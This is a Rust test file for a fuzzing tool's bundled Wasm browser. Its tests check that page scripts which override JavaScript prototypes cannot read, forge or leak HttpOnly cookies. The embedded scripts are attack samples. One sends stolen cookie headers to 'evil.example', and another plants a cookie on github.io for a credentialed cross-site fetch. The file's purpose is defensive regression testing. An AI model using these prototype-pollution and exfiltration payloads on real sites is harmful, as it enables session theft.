//! Cookie behavior is exercised in the bundled Wasm browser, including
//! the headers that reach its network imports rather than only DOM state.
use appfuzz_core::{
    browser::{Browser, FETCH_OTHER, FETCH_OWN, SESSION},
    plan::Plan,
    record::{HostCall, OutcomeKind, RunRecord},
};
use serde_json::{Value, json};

fn visit(script: &str, cookies: Value, extra: Value) -> (RunRecord, Value) {
    let answer = json!({"return":{"ok":{"status":200,"headers":[],"body":""}}});
    visit_planned(script, cookies, extra, json!({FETCH_OWN:answer,FETCH_OTHER:answer}))
}
fn visit_planned(script: &str, cookies: Value, extra: Value, plan: Value) -> (RunRecord, Value) {
    let browser = Browser::shared().unwrap();
    let mut input = json!({"url":"https://app.example/account/page", "html":format!("<!doctype html><html><head><title>cookies</title></head><body><p id=c></p><script>{script}</script></body></html>"), "cookies":cookies});
    input.as_object_mut().unwrap().extend(extra.as_object().unwrap().clone());
    let plan = net_plan(&plan.to_string()).unwrap();
    let mut spec = browser.app.spec(browser.app.export(SESSION).unwrap(), vec![json!(input.to_string())], plan, 1);
    spec.now = "2026-11-02T10:00:00".into();
    let r = browser.app.run(&spec);
    assert_eq!(r.outcome.kind, OutcomeKind::Ok, "{:?}", r.outcome);
    let report: Value = serde_json::from_str(r.result.as_ref().unwrap().as_str().unwrap()).unwrap();
    assert_eq!(report["errors"], json!([]), "{report}");
    (r, report)
}
fn cookie(e: &HostCall) -> Option<&str> {
    e.args["headers"].as_array().unwrap().iter().find(|p| p[0].as_str().unwrap().eq_ignore_ascii_case("cookie")).and_then(|p| p[1].as_str())
}
fn request<'a>(r: &'a RunRecord, path: &str) -> &'a HostCall {
    r.events.iter().find(|e| e.func == FETCH_OWN && e.args["path"] == path).unwrap_or_else(|| panic!("missing {path}: {:?}", r.events))
}

#[test]
fn map_iterator_cannot_expose_httponly_records() {
    let (run, report) = visit(
        r#"(async()=>{const real=Map.prototype[Symbol.iterator];try{Map.prototype[Symbol.iterator]=function*(){for(const pair of real.call(this)){const value=pair[1];if(value&&typeof value==='object'&&typeof value.name==='string'&&typeof value.value==='string')value.httpOnly=false;yield pair}};return document.cookie.includes('sid=hidden-secret')}finally{Map.prototype[Symbol.iterator]=real}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "false", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn map_lookup_cannot_replace_httponly_records() {
    let (run, report) = visit(
        r#"(async()=>{const old=Map.prototype.get;try{Map.prototype.get=()=>undefined;document.cookie='sid=forged; Path=/';return document.cookie.includes('sid=hidden-secret')}finally{Map.prototype.get=old}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "false", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn map_set_cannot_drop_script_cookie_writes() {
    let (run, report) = visit(
        r#"(async()=>{const old=Map.prototype.set;try{Map.prototype.set=function(){return this};document.cookie='mapset=yes; Path=/';return document.cookie.includes('mapset=yes')}finally{Map.prototype.set=old}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "true", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn map_delete_cannot_keep_expired_cookies() {
    let (run, report) = visit(
        r#"(async()=>{document.cookie='gone=old; Path=/';const old=Map.prototype.delete;try{Map.prototype.delete=()=>false;document.cookie='gone=old; Max-Age=0; Path=/';return document.cookie.includes('gone=old')}finally{Map.prototype.delete=old}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "false", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn array_sort_cannot_expose_network_cookie_records() {
    let (run, report) = visit(
        r#"(async()=>{const old=Array.prototype.sort;try{Array.prototype.sort=function(...args){for(let i=0;i<this.length;i++)if(this[i]&&typeof this[i]==='object'&&typeof this[i].name==='string')this[i].httpOnly=false;return Reflect.apply(old,this,args)};await fetch('/echo');return document.cookie.includes('sid=hidden-secret')}finally{Array.prototype.sort=old}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "false", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn array_map_cannot_expose_network_cookie_records() {
    let (run, report) = visit(
        r#"(async()=>{const old=Array.prototype.map;try{Array.prototype.map=function(...args){for(let i=0;i<this.length;i++)if(this[i]&&typeof this[i]==='object'&&typeof this[i].name==='string')this[i].httpOnly=false;return Reflect.apply(old,this,args)};await fetch('/echo');return document.cookie.includes('sid=hidden-secret')}finally{Array.prototype.map=old}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "false", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn json_replacement_cannot_merge_cookie_keys() {
    let (run, report) = visit(
        r#"(async()=>{const old=JSON.stringify;try{JSON.stringify=()=> 'same';document.cookie='jsona=one; Path=/';document.cookie='jsonb=two; Path=/';return document.cookie.includes('jsona=one')&&document.cookie.includes('jsonb=two')}finally{JSON.stringify=old}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "true", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn array_tojson_cannot_merge_cookie_keys() {
    let (run, report) = visit(
        r#"(async()=>{const old=Object.getOwnPropertyDescriptor(Array.prototype,'toJSON');try{Array.prototype.toJSON=()=>['same'];document.cookie='arraya=one; Path=/';document.cookie='arrayb=two; Path=/';return document.cookie.includes('arraya=one')&&document.cookie.includes('arrayb=two')}finally{if(old)Object.defineProperty(Array.prototype,'toJSON',old);else delete Array.prototype.toJSON}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "true", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn inherited_httponly_is_not_a_cookie_attribute() {
    let (run, report) = visit(
        r#"(async()=>{try{Object.prototype.httponly='';document.cookie='inherit_http=yes; Path=/';return document.cookie.includes('inherit_http=yes')}finally{delete Object.prototype.httponly}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "true", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn inherited_domain_is_not_a_cookie_attribute() {
    let (run, report) = visit(
        r#"(async()=>{try{Object.prototype.domain='evil.example';document.cookie='inherit_domain=yes; Path=/';return document.cookie.includes('inherit_domain=yes')}finally{delete Object.prototype.domain}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "true", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn inherited_expiry_is_not_a_cookie_attribute() {
    let (run, report) = visit(
        r#"(async()=>{try{Object.prototype.expires='Thu, 01 Jan 1970 00:00:00 GMT';document.cookie='inherit_expiry=yes; Path=/';return document.cookie.includes('inherit_expiry=yes')}finally{delete Object.prototype.expires}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "true", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn string_lowercase_does_not_change_cookie_host_or_flags() {
    let (run, report) = visit(
        r#"(async()=>{const old=String.prototype.toLowerCase;try{String.prototype.toLowerCase=()=> 'forged';document.cookie='lower=yes; Path=/';return document.cookie.includes('lower=yes')}finally{String.prototype.toLowerCase=old}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "true", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn string_split_does_not_change_cookie_parsing() {
    let (run, report) = visit(
        r#"(async()=>{const old=String.prototype.split;try{String.prototype.split=()=>[];document.cookie='split=yes; Path=/';return document.cookie.includes('split=yes')}finally{String.prototype.split=old}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "true", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn regexp_overrides_cannot_allow_invalid_cookie_names() {
    let (run, report) = visit(
        r#"(async()=>{const old=RegExp.prototype.test;try{RegExp.prototype.test=()=>false;document.cookie='bad\x01name=yes; Path=/';return document.cookie.includes('bad\x01name=')}finally{RegExp.prototype.test=old}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "false", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn date_parse_does_not_change_cookie_expiry() {
    let (run, report) = visit(
        r#"(async()=>{const old=Date.parse;try{Date.parse=()=>0;document.cookie='future=yes; Expires=Thu, 01 Jan 2099 00:00:00 GMT; Path=/';return document.cookie.includes('future=yes')}finally{Date.parse=old}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "true", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn number_constructor_does_not_change_max_age() {
    let (run, report) = visit(
        r#"(async()=>{const old=Number;try{globalThis.Number=()=>0;document.cookie='age=yes; Max-Age=600; Path=/';return document.cookie.includes('age=yes')}finally{globalThis.Number=old}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "true", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn string_constructor_does_not_replace_cookie_input() {
    let (run, report) = visit(
        r#"(async()=>{const old=String;try{globalThis.String=()=> 'forged=yes';document.cookie='string=yes; Path=/';return document.cookie.includes('string=yes')}finally{globalThis.String=old}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "true", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn url_constructor_does_not_replace_cookie_host() {
    let (run, report) = visit(
        r#"(async()=>{const old=URL;try{globalThis.URL=class{constructor(){throw Error('public URL')}};document.cookie='url=yes; Path=/';return document.cookie.includes('url=yes')}finally{globalThis.URL=old}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "true", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn url_prototype_does_not_replace_cookie_host() {
    let (run, report) = visit(
        r#"(async()=>{const old=Object.getOwnPropertyDescriptor(URL.prototype,'hostname');try{Object.defineProperty(URL.prototype,'hostname',{configurable:true,get(){return 'evil.example'}});return document.cookie.includes('public=visible')}finally{Object.defineProperty(URL.prototype,'hostname',old)}})().then(value=>{console.log(JSON.stringify(value));fetch('/capture')});"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "true", "{report}");
    let sent = cookie(request(&run, "/capture")).unwrap();
    assert!(sent.contains("sid=hidden-secret"), "{sent}");
    assert!(!sent.contains("sid=forged"), "{sent}");
}

#[test]
fn public_string_methods_cannot_bypass_private_public_suffix_rules() {
    let (run, _) = visit(
        r#"
const old=String.prototype.charCodeAt;String.prototype.charCodeAt=()=>97;document.cookie='shared=leak; Domain=github.io; Secure; SameSite=None; Path=/';String.prototype.charCodeAt=old;fetch('https://other.github.io/collect',{credentials:'include'});
"#,
        json!({}),
        json!({"url":"https://mine.github.io/"}),
    );
    assert!(run.events.iter().filter(|e| e.func == FETCH_OTHER).all(|e| cookie(e).is_none()));
}

#[test]
fn array_index_setters_do_not_receive_private_network_cookie_records() {
    let (run, report) = visit(
        r#"
const define=Object.defineProperty;define(Array.prototype,'0',{configurable:true,set(value){define(this,'0',{value,writable:true,enumerable:true,configurable:true});if(value&&typeof value==='object'&&value.httpOnly)value.httpOnly=false}});fetch('/echo').then(()=>{delete Array.prototype[0];console.log(document.cookie.includes('sid=hidden-secret'))});
"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true},"public":"visible"}),
        json!({}),
    );
    assert_eq!(report["console"][0]["text"], "false", "{report}");
    assert!(cookie(request(&run, "/echo")).unwrap().contains("sid=hidden-secret"));
}

#[test]
fn array_index_setters_do_not_receive_private_report_records() {
    let (run, _) = visit(
        r#"
fetch('/seed');const define=Object.defineProperty;define(Array.prototype,'0',{configurable:true,set(value){define(this,'0',{value,writable:true,enumerable:true,configurable:true});if(value&&typeof value==='object'&&value.requests){for(let i=0;i<value.requests.length;i++){const headers=value.requests[i].headers;if(headers&&headers.cookie&&headers.cookie.includes('hidden-secret')){fetch('https://evil.example/?s='+encodeURIComponent(headers.cookie));break}}}}});
"#,
        json!({"sid":{"value":"hidden-secret","httpOnly":true}}),
        json!({}),
    );
    assert!(run.events.iter().all(|e| e.func != FETCH_OTHER), "{:?}", run.events);
}

#[test]
fn cookie_user_agent_parsing_accepts_spaces_in_names() {
    let (run, report) =
        visit("document.cookie='space name=yes; Path=/';console.log(document.cookie.includes('space name=yes'));fetch('/capture')", json!({}), json!({}));
    assert_eq!(report["console"][0]["text"], "true");
    assert_eq!(cookie(request(&run, "/capture")), Some("space name=yes"));
}

#[test]
fn native_response_arrays_do_not_invoke_page_index_setters() {
    let (run, report) = visit_planned(
        r#"
const captured=[],define=Object.defineProperty;for(const key of ['0','1'])define(Array.prototype,key,{configurable:true,set(value){define(this,key,{value,writable:true,enumerable:true,configurable:true});define(captured,captured.length,{value:this,writable:true,enumerable:true,configurable:true})}});fetch('/login').then(()=>{delete Array.prototype[0];delete Array.prototype[1];for(const value of captured)try{console.log(JSON.stringify(value))}catch{}console.log('done');fetch('/capture')});
"#,
        json!({}),
        json!({}),
        json!({FETCH_OWN:{"return":{"ok":{"status":200,"headers":[["set-cookie","sid=hidden-server-secret; HttpOnly; Path=/"]],"body":"ok"}}}}),
    );
    assert!(report["console"].as_array().unwrap().iter().any(|v| v["text"] == "done"), "{report}");
    assert!(report["console"].as_array().unwrap().iter().all(|v| !v["text"].as_str().unwrap().contains("hidden-server-secret")), "{report}");
    assert!(cookie(request(&run, "/capture")).unwrap().contains("sid=hidden-server-secret"));
}

#[test]
fn native_response_arrays_do_not_invoke_page_iterators() {
    let (run, report) = visit_planned(
        r#"
const captured=[],define=Object.defineProperty,old=Array.prototype[Symbol.iterator];Array.prototype[Symbol.iterator]=function*(){try{define(captured,captured.length,{value:JSON.stringify(this),writable:true,enumerable:true,configurable:true})}catch{}yield*Reflect.apply(old,this,[])};fetch('/login').then(()=>{Array.prototype[Symbol.iterator]=old;for(const value of captured)console.log(value);console.log('done');fetch('/capture')});
"#,
        json!({}),
        json!({}),
        json!({FETCH_OWN:{"return":{"ok":{"status":200,"headers":[["set-cookie","sid=hidden-server-secret; HttpOnly; Path=/"]],"body":"ok"}}}}),
    );
    assert!(report["console"].as_array().unwrap().iter().any(|v| v["text"] == "done"), "{report}");
    assert!(report["console"].as_array().unwrap().iter().all(|v| !v["text"].as_str().unwrap().contains("hidden-server-secret")), "{report}");
    assert!(cookie(request(&run, "/capture")).unwrap().contains("sid=hidden-server-secret"));
}

#[path = "support/browser_plan.rs"]
mod browser_plan;
fn net_plan(text: &str) -> anyhow::Result<Plan> {
    browser_plan::parse(text)
}
